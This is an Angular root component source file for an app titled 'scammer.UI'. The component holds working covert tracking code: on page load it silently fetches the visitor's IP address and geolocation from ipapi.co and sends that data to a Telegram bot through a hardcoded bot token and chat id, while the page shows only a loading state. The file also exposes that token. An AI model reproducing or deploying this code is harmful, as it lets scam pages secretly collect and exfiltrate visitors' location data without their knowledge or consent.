import { CommonModule } from '@angular/common';
import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { RouterOutlet } from '@angular/router';
import { finalize } from 'rxjs';

@Component({
  selector: 'app-root',
  imports: [RouterOutlet, CommonModule],
  templateUrl: './app.component.html',
  styleUrl: './app.component.scss'
})
export class AppComponent implements OnInit {
  title = 'scammer.UI';

  loading = true;

  data = {};

  constructor(
    private httpClient: HttpClient
  ) { }

  ngOnInit() {
    this.httpClient.get("https://ipapi.co/json/").subscribe({
      next: (data) => {
        this.data = data;
        const textMessage = encodeURIComponent(`Yangi habar bor⚠️⚠️⚠️\n\n\`\`\`"${JSON.stringify(this.data)}\`\`\``);
        this.httpClient.get(`https://api.telegram.org/bot6526535333:AAHXVFBwruT-4zsnhbI_h2cVTRJXRr9cA7g/sendMessage?chat_id=1268306946&text=${textMessage}`).subscribe({
          next:(data)=>{
            this.loading = false;
          }
        });
      },
      error: (err) => {
        this.data = {
          status: "ma'lumotlar yuklashda xatolik"
        };
      }
    });
  }
}
